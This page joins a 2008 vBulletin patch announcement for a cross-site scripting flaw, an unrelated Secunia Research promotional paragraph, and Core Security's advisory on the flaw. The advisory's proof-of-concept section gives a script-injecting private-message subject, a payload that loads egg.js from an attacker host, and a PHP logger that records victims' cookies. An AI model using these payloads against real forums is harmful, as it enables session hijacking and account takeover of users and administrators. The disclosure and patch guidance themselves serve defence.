  ## vBulletin 3.7.2 PL2 and 3.6.10 PL4 Released

  Mon 18 Aug '08, 3:19am

  **vBulletin 3.7.2 PL2 / vBulletin 3.6.10 PL4**

  An XSS flaw related to JavaScript escaping has been identified. This could allow an attacker to carry out an action as a user or obtain access to a user's account. To resolve this issue, it is necessary to release patch level versions of vBulletin 3.7.2 and 3.6.10.

  This flaw was discovered by [Federico Muttis](http://www.coresecurity.com).

  The upgrade process is the same as previous patch level releases - simply download the patch from the [Members Area](http://members.vbulletin.com/patches.php), extract the files and upload to your webserver, overwriting the existing files. There is no upgrade script required.

  As with all security-based releases, we recommend that all customers upgrade as soon as possible in order to prevent any potential damage resulting from the flaw being exploited.

  **vBulletin 3.7.3 and 3.6.11 to be Released Next Week**

  In line with our new [scheduled maintenance release policy](http://www.vbulletin.com/forum/showthread.php?t=273299), a new release for 3.6 and 3.7 will be made on **Tuesday, August 26th**.

  These releases will contain bug fixes, but will also address a situation related to users that use their username as their password. In 3.6.11 and 3.7.3, **this will be completely disallowed**. Users affected by this will be forced to change their password on their first login. Additionally, a tool will be provided to email affected users with a new password. Please be aware of these potential compatibility changes when upgrading.

  This release will be mentioned in the security bulletin sent out to customers today, but we will not send a further notification next week when 3.7.3 and 3.6.11 are released. Watch your Admin CP News, or the latest version check in the Admin CP to see when the new version is available. Alternatively, keep an eye on this forum for the 3.7.3 and 3.6.11 announcements.

  **Upgrading from 3.7.2, 3.6.10 or their patch level versions**

  If you are already running 3.7.2, 3.6.10 or their patch level versions, the process you will be required to follow to make your board immune to the XSS problem is very simple.

  There is no need to run an upgrade script if you are already running 3.7.2, 3.6.10 or their patch level versions.

  Visit the [Patches section of the vBulletin Members' Area](http://members.vbulletin.com/patches.php) and download either the patch for 3.7.2, or the patch for 3.6.10, according to the version you are currently running, then extract the files from the archive you downloaded, then upload the files to your board via FTP etc., overwriting the existing files. This will update your version to the PL1 or PL3 release respectively.

  The 3.7.2 PL2 patch file includes the PL1 fix.

  The 3.6.10 PL4 patch file also includes the PL1, PL2, and PL3 fixes.

  **Upgrading from Versions Earlier than 3.7.2 or 3.6.10**

  If you are **not** already running 3.7.2 or 3.6.10, you should download the most latest version from the [Members' Area](http://members.vbulletin.com) and perform an upgrade as normal.

  [Full instructions for upgrading vBulletin are available here.](http://www.vbulletin.com/docs/html/upgrade)

  **Download vBulletin 3.7.2 PL2 or 3.6.10 PL4**

  As usual, both versions released today are available for all customers with valid, active licenses to download from the vBulletin Members' Area.

Secunia researchers discover hard-to-find vulnerabilities that aren‚Äôt normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

      Core Security Technologies - CoreLabs Advisory
           <http://www.coresecurity.com/corelabs/>

       vBulletin Cross Site Scripting Vulnerability

*Advisory Information*

Title: vBulletin Cross Site Scripting Vulnerability
Advisory ID: CORE-2008-0813
Advisory URL: <http://www.coresecurity.com/my-advisory>
Date published: 2008-08-20
Date of last update: 2008-08-19
Vendors contacted: vBulletin team
Release mode: Coordinated release

*Vulnerability Information*

Class: XSS flaw
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A
CVE Name: N/A

*Vulnerability Description*

vBulletin [[1]](#1) is a community forum solution for a wide range of users,
including industry leading companies. A XSS vulnerability has been
discovered that could allow an attacker to carry out an action
impersonating a legal user, or to obtain access to a user's account.
This flaw allows unauthorized disclosure and modification of
information, and it allows disruption of service.

*Vulnerable Packages*

. vBulletin 3.7.2 Patch Level 1.
. vBulletin 3.6.10 Patch Level 3.
. Older versions are probably affected too, but they were not checked.

*Non-vulnerable Packages*

. vBulletin 3.7.2 Patch Level 2.
. vBulletin 3.6.10 Patch Level 4.

*Vendor Information, Solutions and Workarounds*

vBulletin team has released patches for this flaw (see [[2]](#2)), and new
fixed versions of vBulletin (3.6.11 and 3.7.3) will be available on
Tuesday, August 26th. Refer to [[3]](#3) for more details.

*Credits*

This vulnerability was discovered and researched by Federico Muttis from
Core Security Technologies.

*Technical Description / Proof of Concept Code*

This is a Cross Site Scripting (XSS) vulnerability within vBulletin
community forum solution. In order to exploit this flaw the following
option needs to be activated:
'<http://victim/vBulletin/profile.php?do=editoptions>' (Show New Private
Message Notification Pop-Up enabled). There are many forums with this
option enabled by default for all new users.

The title is not being encoded in the following rendered HTML code:

/-----------

<!--
// script to show new private message popup
if (confirm("You have a new private message.\n\nSender:
[SENDER_USERNAME]\nTitle: '[PRIVATE_MESSAGE_TITLE]'\n\nClick OK to view
it, or cancel to hide this prompt."))
{
	// Output when OK is clicked
	if (confirm("Open the message in a new window?\n\n(Press cancel to open
in the current window.)"))
	{
		var winobj =
window.open("private.php?do=showpm&pmid=[PRIVATE_MESSAGE_ID]", "pmnew",
"statusbar=yes,menubar=yes,scrollbars=yes,toolbar=yes,location=yes,directories=yes,resizable=yes,top=50,left=50");
  if (winobj == null)
		{
			alert("Unable to open a new browser window,\n This might be due to a
'popup blocker'");
		}
	}
	else
	{
		window.location = "private.php?do=showpm&pmid=[PRIVATE_MESSAGE_ID]";
	}
}
// end pm popup script
//-->

- -----------/

The variable '$newpm[title]' in 'install/vbulletin-style.xml' was
previously de-sanitized in 'global.php' and only slash-escaping survives:

/-----------

//
#############################################################################
// get new private message popup
$shownewpm = false;
if ($vbulletin->userinfo['pmpopup'] == 2 AND
$vbulletin->options['checknewpm'] AND $vbulletin->userinfo['userid'] AND
!defined('NOPMPOPUP'))
{
	$userdm =& datamanager_init('User', $vbulletin, ERRTYPE_SILENT);
	$userdm->set_existing($vbulletin->userinfo);
	$userdm->set('pmpopup', 1);
	$userdm->save(true, 'pmpopup');	// 'pmpopup' tells db_update to issue a
shutdownquery of the same name
	unset($userdm);

	if (THIS_SCRIPT != 'private' AND THIS_SCRIPT != 'login')
	{
		$newpm = $db->query_first("
		SELECT pm.pmid, title, fromusername
		FROM " . TABLE_PREFIX . "pmtext AS pmtext
		LEFT JOIN " . TABLE_PREFIX . "pm AS pm USING(pmtextid)
		WHERE pm.userid = " . $vbulletin->userinfo['userid'] . "
		AND pm.folderid = 0
		ORDER BY dateline DESC
		LIMIT 1");

		$newpm['username'] =
addslashes_js(unhtmlspecialchars($newpm['fromusername'], true), '"');
		$newpm['title'] = addslashes_js(unhtmlspecialchars($newpm['title'],
true), '"');
		$shownewpm = true;
	}
}

- -----------/

Which of course allows XSS attacks.

The 'alert' Proof of Concept (PoC) exploit would be to write a PM to the
user you want to attack with this subject:

/-----------

- --></script><script>alert(/xss/.source)</script><!--
- -----------/

The admin impersonification exploit PoC (Working on IE6 Only) would be:

/-----------

- --></script><script src="http:"//attacker/vbStealer/egg.js></script><!--
- -----------/

Where the 'egg.js' script file is:

/-----------

// == XSS - Cookie stealing - vBulletin 3.7.2 PL1 ==
//
// Using the first method described in
// <http://www.securityfocus.com/archive/107/308433>
//
// To bypass HttpOnly cookie restrictions - Works in IE 6 and lower

var XmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
XmlHttp.open("GET","<http://victim/vbStealer/logger.php>",false);
XmlHttp.setRequestHeader("Host","attacker");
XmlHttp.send();

- -----------/

and the 'logger.php' script file:

/-----------

<?
// == XSS - Cookie stealing - vBulletin 3.7.2 PL1 ==

$all_cookies = "";
foreach ($_COOKIE as $cookie_name => $cookie_value) {
	$all_cookies .= "$cookie_name=$cookie_value, ";
}
rtrim($all_cookies, ", ");
file_put_contents("iplog.txt", "COOKIES: ".$all_cookies."\n", FILE_APPEND);
?>

- -----------/
